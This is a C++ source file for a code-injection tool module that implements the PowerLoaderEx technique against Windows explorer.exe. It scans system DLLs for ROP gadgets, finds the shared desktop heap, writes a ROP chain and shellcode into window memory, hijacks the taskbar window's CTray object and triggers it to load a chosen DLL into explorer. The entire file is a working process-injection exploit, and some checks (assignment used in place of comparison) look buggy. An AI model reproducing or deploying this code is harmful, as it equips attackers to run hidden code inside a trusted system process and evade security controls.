#include "../common.h"
#include "inj_powerloader_ex.h"

// ==============================
// Core logic of this injector uses Ensilo's reference implementation at
// https://raw.githubusercontent.com/BreakingMalware/PowerLoaderEx/master/PowerLoaderEx.cpp
// ==============================

#define MAX_LOADSTRING 100
TCHAR szTitle[MAX_LOADSTRING] = _T("PowerLoaderEx");					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING] = _T("PowerLoaderExCls");			// the main window class name

std::vector<LONG_PTR> dllAddress;

PBYTE SearchMemory(PBYTE Start, SIZE_T Size, PBYTE Buffer, SIZE_T BufLen)
{
	while (Size > BufLen)
	{
		if (memcmp(Start, Buffer, BufLen) == 0)
		{
			return Start;
		}

		Start++;
		Size--;
	}
	return NULL;
}

PBYTE ExpressionSearchMemory(PBYTE Start, SIZE_T Size, PBYTE Buffer, SIZE_T BufLen)
{
	while (Size > BufLen)
	{
		UINT i = 0;
		for (; i < BufLen; i++)
		{
			if (Buffer[i] == '?')
			{
				continue;
			}
			else if (Buffer[i] != Start[i])
			{
				break;
			}
		}
		if (i >= BufLen)
		{
			return Start;
		}

		Start++;
		Size--;
	}
	return NULL;
}


const TCHAR *ModulesList[] = { _T("ntdll.dll"), _T("kernel32.dll"), _T("kernelbase.dll"), _T("user32.dll"), _T("shell32.dll"), NULL };

#define EXACT_GADGET 1
#define EXPRESSION_GADGET 2

typedef struct _GADGET {
	const CHAR *Gadget;
	UINT  Len;
	const TCHAR *Module;
	PVOID ModuleBase;
	SIZE_T Offset;
	UINT  Type;
} GADGET, *PGADGET;

GADGET Gadgets[] = {
#ifdef _WIN64
	{ "\xC3", 2, NULL, NULL, 0, EXACT_GADGET },
#else
{ "\xFD\xC3", 2, NULL, NULL, 0, EXACT_GADGET }, /*std,ret;*/
{ "\xFC\xC3", 2, NULL, NULL, 0, EXACT_GADGET }, /*cld,ret;*/
{ "\x58\xc3", 2, NULL, NULL, 0, EXACT_GADGET }, /*pop rax,ret;*/
{ "\xFF\xE0", 2, NULL, NULL, 0, EXACT_GADGET }, /*jmp rax*/
{ "\xb9\x94\x00\x00\x00\xf3\xa5\x5f\x33\xc0\x5e\x5d\xc2\x08\x00", 15, NULL, NULL, 0, EXACT_GADGET },
{ "\xff\xd0\xc3", 3, NULL, NULL, 0, EXACT_GADGET }, /*call rbx,ret;*/
#endif
{ NULL, 0, NULL, NULL, 0 }
};

#define GADGET_ADDRESS(g) ((SIZE_T)(g).ModuleBase + (SIZE_T)(g).Offset)

BOOL FindGadgets(HANDLE TargetProcess)
{
	UINT i = 0;
	UINT j = 0;
	HMODULE Module;
	const TCHAR *ModuleName = NULL;
	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
	PBYTE RegionStart;
	PBYTE GadgetStart;
	BOOL FoundGadget = FALSE;
	TCHAR Name[MAX_PATH + 1] = { 0 };

	while (Gadgets[i].Gadget)
	{
		j = 0;

		FoundGadget = FALSE;

		while (!FoundGadget && ModulesList[j])
		{
			Module = GetModuleHandle(ModulesList[j]);

			RegionStart = (PBYTE)Module;

			while (!FoundGadget && VirtualQuery(RegionStart, &MemInfo, sizeof(MemInfo)) && MemInfo.AllocationBase == (PVOID)Module)
			{
				if (MemInfo.State == MEM_COMMIT && MemInfo.Type == MEM_IMAGE && (MemInfo.Protect == PAGE_EXECUTE || MemInfo.Protect == PAGE_EXECUTE_READ))
				{
					if (Gadgets[i].Type == EXACT_GADGET)
					{
						GadgetStart = SearchMemory((PBYTE)MemInfo.BaseAddress, MemInfo.RegionSize, (PBYTE)Gadgets[i].Gadget, Gadgets[i].Len);
					}
					else
					{
						GadgetStart = ExpressionSearchMemory((PBYTE)MemInfo.BaseAddress, MemInfo.RegionSize, (PBYTE)Gadgets[i].Gadget, Gadgets[i].Len);
					}
					if (GadgetStart)
					{
						Gadgets[i].Module = ModulesList[j];
						Gadgets[i].ModuleBase = Module;
						Gadgets[i].Offset = (SIZE_T)GadgetStart - (SIZE_T)Module;

						FoundGadget = TRUE;
						break;

					}
				}
				RegionStart += MemInfo.RegionSize;
			}

			j++;
		}

		if (!FoundGadget)
		{
			return FALSE;
		}
		i++;
	}
	return TRUE;
}


#define NUM_OF_MAGICS 4
ULONG Magics[NUM_OF_MAGICS] = { 0xABABABAB, 0xCDCDCDCD, 0xABABABAB, 0xCDCDCDCD };


PVOID FindProecssDesktopHeap(HANDLE ProecssHandle, SIZE_T HeapSize)
{
	BYTE *Addr = (BYTE*)0x1000;
	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
	ULONG OldProt = 0;

	while (VirtualQueryEx(ProecssHandle, Addr, &MemInfo, sizeof(MemInfo)))
	{
		if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT && MemInfo.RegionSize == HeapSize)
		{
			// Double check.
			if (!VirtualProtectEx(ProecssHandle, Addr, 0x1000, PAGE_READWRITE, &OldProt))
			{
				return MemInfo.BaseAddress;
			}
			else
			{
				VirtualProtectEx(ProecssHandle, Addr, 0x1000, OldProt, &OldProt);
			}
		}
		Addr += MemInfo.RegionSize;
	}

	return NULL;
}


PVOID FindDesktopHeap(HWND myWnd, SIZE_T *MagicOffset, SIZE_T *size)
{
	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
	BYTE *Addr = (BYTE*)0x1000;
	PBYTE tmp;
	ULONG OldProt = 0;

	// insert the magic we will look for.
	for (UINT i = 0; i < NUM_OF_MAGICS; i++)
	{
		SetLastError(0);
		SetWindowLong(myWnd, i * sizeof(ULONG), Magics[i]);
		if (GetLastError() != 0)
		{
			return NULL;
		}
	}
	// Try to find the magics.
	while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
	{
		if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
		{
			tmp = SearchMemory((PBYTE)MemInfo.BaseAddress, MemInfo.RegionSize, (PBYTE)Magics, sizeof(Magics));
			if (tmp && !VirtualProtect(Addr, 0x1000, PAGE_READWRITE, &OldProt))
			{
				// return section information.
				*size = MemInfo.RegionSize;
				*MagicOffset = (SIZE_T)tmp - (SIZE_T)MemInfo.AllocationBase;
				return MemInfo.BaseAddress;
			}
		}
		Addr += MemInfo.RegionSize;
	}

	return NULL;
}

#ifdef _WIN64
#define _fnINSTRINGNULL_INDEX 0x1a
PVOID BuildAttackBuffer(HWND window, PVOID ExplorerSharedHeap, SIZE_T WindowBufferOffset)
{
	PVOID LoadLibraryAddr = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "LoadLibraryA");
	UINT CurrIndex = 0;

	// Get the callback table.
	PTEB Teb = NtCurrentTeb();
	PBYTE Peb = (PBYTE)Teb->ProcessEnvironmentBlock;
	PVOID* CallbackTable = *(PVOID**)((PBYTE)Peb + 0x58);
	PVOID TargetFunction = CallbackTable[_fnINSTRINGNULL_INDEX];

#define SET_LONG(value) SetWindowLongPtr(window, CurrIndex*8, (LONG_PTR)value);CurrIndex++;
	SET_LONG((SIZE_T)ExplorerSharedHeap + WindowBufferOffset + 0x10);
	SET_LONG(0); // Must be zero 
	SET_LONG(TargetFunction); // Make it point to target function
	SET_LONG(GADGET_ADDRESS(Gadgets[0])); // This should point to ret
	SET_LONG(GADGET_ADDRESS(Gadgets[0])); // This should point to ret
	SET_LONG(ExplorerSharedHeap + WindowBufferOffset + (CurrIndex + 5) * 8); // This should point to the library to load    
	SET_LONG(5);
	SET_LONG(6);
	SET_LONG(7);
	SET_LONG(LoadLibraryAddr); // This is the LoadLibraryFunction

							   // Now we write the library to load
	SET_LONG(0x6c6c642e785c3a63); // This is c:\\x.dll
	//pushing harcoded values to target DLL
	/*
	for (auto value : dllAddress)
	{
		SET_LONG(value);
	}
	*/
	SET_LONG(0);

#undef SET_LONG

	return (PVOID)((SIZE_T)ExplorerSharedHeap + WindowBufferOffset);
}

#else

PVOID BuildAttackBuffer(HWND window, PVOID ExplorerSharedHeap, SIZE_T WindowBufferOffset)
{
	PVOID KiUserApcDispatcher = (PVOID)GetProcAddress(LoadLibrary(_T("ntdll.dll")), "KiUserApcDispatcher");
	PVOID WriteProcessMemory = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "WriteProcessMemory");
	PVOID ntchkstk = (PVOID)GetProcAddress(LoadLibrary(_T("ntdll.dll")), "_chkstk");
	PVOID atan = (PVOID)GetProcAddress(LoadLibrary(_T("ntdll.dll")), "atan");
	PVOID LoadLibraryAddr = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "LoadLibraryA");
	UINT CurrIndex = 0;
	UINT returnedIdx = 0;
	UINT ShellcodeAddrIndx = 0;
	UINT ShellcodeStartIndx = 0;
	UINT LoadedLibraryStrIndx = 0;
#define SET_LONG(value) SetWindowLong(window, CurrIndex*4, (ULONG)value);CurrIndex++;
	SET_LONG(GADGET_ADDRESS(Gadgets[5]) + 2); // call eax ret
	SET_LONG(0xFFFFFFFF); // Current process
	SET_LONG(atan);       // where to write
	ShellcodeAddrIndx = CurrIndex;
	SET_LONG(1);          // what to write
	SET_LONG(0x70);       // how much to write
	SET_LONG(0);          // where to write the bytes written.
	SET_LONG(atan);       // Run shellcode.
	SET_LONG(6);          // where to land.
	SET_LONG(7);
	SET_LONG(8);
	SET_LONG(9);
	SET_LONG(10);
	SET_LONG(11);
	SET_LONG(12);
	SET_LONG(13);
	SET_LONG(14);
	SET_LONG(15);
	SET_LONG(16);
	SET_LONG(17);
	SET_LONG(18);
	SET_LONG(0);
	SET_LONG(GADGET_ADDRESS(Gadgets[1]));
	SET_LONG(0);
	SET_LONG(0);
	SET_LONG(GADGET_ADDRESS(Gadgets[2]));
	SET_LONG(0x70);
	SET_LONG(ntchkstk);
	SET_LONG(WriteProcessMemory);
	returnedIdx = CurrIndex;
	SET_LONG((SIZE_T)ExplorerSharedHeap + WindowBufferOffset + (CurrIndex + 4) * 4);
	SET_LONG(0);
	SET_LONG(0);
	SET_LONG(0);
	SET_LONG(KiUserApcDispatcher);
	SET_LONG(GADGET_ADDRESS(Gadgets[4]));
	SET_LONG(GADGET_ADDRESS(Gadgets[0]));
	LoadedLibraryStrIndx = CurrIndex;
	SET_LONG(0x785c3a63);
	SET_LONG(0x6c6c642e); // This is c:\\x.dll
//pushing harcoded values to target DLL
	/*
	for (auto value : dllAddress)
	{
		SET_LONG(value);
	}
	*/
	SET_LONG(0);
	ShellcodeStartIndx = CurrIndex;
	SET_LONG(0x68909090);
	SET_LONG((SIZE_T)ExplorerSharedHeap + WindowBufferOffset + LoadedLibraryStrIndx * 4);
	SET_LONG(0xb8909090);
	SET_LONG((LONG)LoadLibraryAddr);
	SET_LONG(0x9090d0ff);
	SET_LONG(0xc35cc483); // Fix stack and return
	SetWindowLong(window, ShellcodeAddrIndx * 4, (SIZE_T)ExplorerSharedHeap + WindowBufferOffset + ShellcodeStartIndx * 4);
#undef SET_LONG

	return (PVOID)((SIZE_T)ExplorerSharedHeap + WindowBufferOffset + returnedIdx * 4);

}
#endif

DWORD GetExplorerPID()
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32 = { 0 };
	DWORD Pid = 0;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		return 0;
	}

	do
	{
		if (_tcscmp(pe32.szExeFile, _T("explorer.exe")) == 0)
		{
			Pid = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	if (Pid == 0)
	{
		return 0;
	}

	return Pid;
}

BOOL InjectExplorer(HWND myWnd)
{
	BOOL ret = TRUE;
	PVOID CTrayObj;
	PVOID DesktopHeapBase = NULL;
	PVOID ExplorerDesktopHeap = NULL;
	SIZE_T SharedHeapSize = NULL;
	SIZE_T WindowBufferOffset = NULL;
	HANDLE ExplorerHandle = NULL;
	DWORD pid;

	// Find the desktop heap in the current process
	DesktopHeapBase = FindDesktopHeap(myWnd, &WindowBufferOffset, &SharedHeapSize);

	if (!DesktopHeapBase)
	{
		ret = FALSE;
		goto clean;
	}

	// Get the PID for explorer.exe
	pid = GetExplorerPID();

	if (!pid)
	{
		ret = FALSE;
		goto clean;
	}

	// Open explorer.exe
	ExplorerHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);

	if (!ExplorerHandle)
	{
		ret = FALSE;
		goto clean;
	}

#ifndef _WIN64
	// Find required Gadgets on 64 bit.
	if (!FindGadgets(ExplorerHandle))
	{
		ret = FALSE;
		goto clean;
	}
#endif

	// Find Explorer's desktop heap
	ExplorerDesktopHeap = FindProecssDesktopHeap(ExplorerHandle, SharedHeapSize);

	if (!ExplorerDesktopHeap)
	{
		ret = FALSE;
		goto clean;
	}

	// Find the target window
	HWND hShellTrayWnd = FindWindow(_T("Shell_TrayWnd"), NULL);

	if (!hShellTrayWnd)
	{
		ret = FALSE;
		goto clean;
	}

	// Get the CTray object
	CTrayObj = (PVOID)GetWindowLongPtr(hShellTrayWnd, 0);

	if (!hShellTrayWnd)
	{
		ret = FALSE;
		goto clean;
	}

	// Build the attack buffer on the window.
	PVOID MaliciousCTrayObj = BuildAttackBuffer(myWnd, ExplorerDesktopHeap, WindowBufferOffset);

	// Overwrite the CTray Object
	SetWindowLongPtr(hShellTrayWnd, 0, (LONG_PTR)MaliciousCTrayObj);

	// Trigger the injection
	SendNotifyMessage(hShellTrayWnd, WM_PAINT, 0xABABABAB, 0);

	// Wait For It
	Sleep(1000);

	// Restore Old Object
	SetWindowLongPtr(hShellTrayWnd, 0, (LONG_PTR)CTrayObj);

clean:
	if (ExplorerHandle)
	{
		CloseHandle(ExplorerHandle);
	}

	return ret;
}


ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = DefWindowProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0x200;
	wcex.hInstance = hInstance;
	wcex.hIcon = NULL;
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = NULL;

	return RegisterClassEx(&wcex);
}


bool InjectorPowerloaderEx::Execute(const std::wstring &codeToInject, const std::wstring &targetToInject)
{
	bool ret = false;
	blackbone::Process targetProc;
	blackbone::pe::PEImage sourceModule;

	std::wcout << L"[+] About to execute " << GetDescription() << std::endl;

	std::wcout << L"[+] Attaching to target process and parsing source mode" << std::endl;
	if (InjectorHelpers::GetExecutionContext(codeToInject, targetToInject, sourceModule, targetProc))
	{
		std::wcout << L"[+] Only injection to explorer.exe is supported for the moment" << std::endl;
		if (InjectorHelpers::StrContainsPatternInsensitive(targetProc.modules().GetMainModule()->name, L"explorer.exe"))
		{
			DWORD targetPID = InjectorHelpers::ToInteger(targetToInject);
			std::wcout << L"[+] You provided explorer.exe pid as the target, good!" << std::endl;
			std::wcout << L"[+] Working with PID " << targetPID << std::endl;

			std::wcout << L"[+] Generating values to push to the stack the name of target DLL during ROP chain execution" << std::endl;

			dllAddress.clear();
			std::string hexStringRepresentation;
			std::string reversedOutput;
			std::string roundedOutput;
			std::string convertedInput = InjectorHelpers::WStrToStr(codeToInject);
			size_t lengthToRoundup = 0;
			size_t inputSize = convertedInput.size();
			size_t ROUND_VALUE = sizeof(LONG_PTR);
			if ((inputSize > 0) &&
				InjectorHelpers::GetNearestRoundValue(inputSize, ROUND_VALUE, lengthToRoundup) &&
				InjectorHelpers::PadStringWithValue(convertedInput, lengthToRoundup, '0', roundedOutput) &&
				InjectorHelpers::ReverseString(roundedOutput, reversedOutput))
			{
				for (size_t it = 0; it < reversedOutput.length(); it += ROUND_VALUE)
				{
					std::string workStrContent = reversedOutput.substr(it, ROUND_VALUE);

					LONG_PTR workValue = 0;
					size_t charIT = 0;
					size_t roundIT = 0;
					for (charIT = 0, roundIT = (ROUND_VALUE - 1); charIT < ROUND_VALUE; charIT++, roundIT--)
					{
						workValue += (((LONG_PTR)workStrContent[charIT]) << (roundIT * ROUND_VALUE));
					}

					dllAddress.push_back(workValue);
				}
			}

			if (dllAddress.size() > 0)
			{
				std::wcout << L"[+] " << dllAddress.size() << L" chunks were generated" << std::endl;

				HINSTANCE hInstC = GetModuleHandle(NULL);
				if (hInstC != NULL)
				{

					// Initialize global strings
					MyRegisterClass(hInstC);

					// Perform application initialization:
					HWND hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
						CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstC, NULL);

					if (hWnd)
					{
						//TODO Add sanity check for this
						LoadLibrary(_T("Shell32.dll"));

						if (InjectExplorer(hWnd))
						{
							std::wcout << L"[+] Success! DLL injected via InjectorPowerloaderEx method" << std::endl;
							ret = true;
						}
						else
						{
							std::wcout << L"[-] There was a problem executing the powerloaderex injection method" << std::endl;
						}
					}
					else
					{
						std::wcout << L"[-] There was a problem creating initialization window" << std::endl;
					}
				}
				else
				{
					std::wcout << L"[-] Context of module cannot be retrieved" << std::endl;
				}
			}
			else
			{
				std::wcout << L"[-] There was a problem generating value to push to the stack during ROP Chain Execution" << std::endl;
			}
		}
		else
		{
			std::wcout << L"[-] There was a problem with provided context. Did you provided explorer.exe as target pid?" << std::endl;
		}
	}
	else
	{
		std::wcout << L"[-] There was a problem setting up injection context data " << std::endl;
	}

	return ret;
}
